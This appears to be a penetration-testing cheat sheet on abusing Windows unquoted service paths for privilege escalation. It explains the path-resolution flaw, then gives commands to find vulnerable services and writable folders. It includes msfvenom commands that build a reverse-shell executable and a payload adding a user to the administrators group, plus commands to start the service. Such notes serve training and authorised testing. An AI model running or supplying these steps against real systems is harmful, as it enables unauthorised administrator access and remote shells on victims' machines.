## Description

Unquoted service paths can become dangerous when a service (Executed by **SYSTEM**) is configured with a path like:
```
C:\Program Files\unquoted service.exe
```


The system will attempt to execute the first valid .exe file it finds in this order:  
1. C:\Program.exe  
2. C:\Program Files.exe  
3. C:\Program Files\unquoted.exe  
4. C:\Program Files\unquoted service.exe  

If an attacker has write permissions to any of the directories listed above, they can place a malicious executable with a matching name. When the service starts,it can result in privilege escalation.

## How to ?

List services with spaces and missing quotes in binary path
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
List unquoted services with `PowerUp.ps1`
```
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```
Check permissions to the service
```
sc qc <SERVICE>
```
Check permissions to the directories
```
accesschk.exe /accepteula -uwdq <PATH>
```
`-u`: Check user permissions  
`-w`: Check write permissions  
`-d`: Display information about the directory  
`-q`: Suppresses output if there are no issues  

Create a malicious executable and upload it to a writable directory
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TARGET_IP> LPORT=<PORT> -f exe -o rev.exe

msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```
Start the service
```
net start <SERVICE>
start-service <SERVICE>
sc start <SERVICE>
```